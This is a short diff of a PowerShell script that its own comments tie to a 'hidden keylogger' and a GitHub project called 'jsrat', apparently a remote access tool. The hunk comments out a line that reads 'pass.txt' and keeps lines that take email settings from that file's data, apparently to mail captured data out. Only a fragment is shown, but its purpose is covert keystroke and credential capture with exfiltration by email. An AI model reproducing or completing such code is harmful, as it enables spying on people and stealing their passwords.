@@ -3,8 +3,8 @@
 # It will show a window if it runs standalone. However, when you start it from
 # the hidden keylogger it will run ~perfectly~
 # Coded by @J-P-S-O (https://github.com/J-P-S-O/jsrat)
-
-$file_data = Get-Content pass.txt
+#
+#$file_data = Get-Content pass.txt
 $EmailFrom = $file_data[2]
 $EmailTo = $file_data[2]
 $Subject = Get-Date
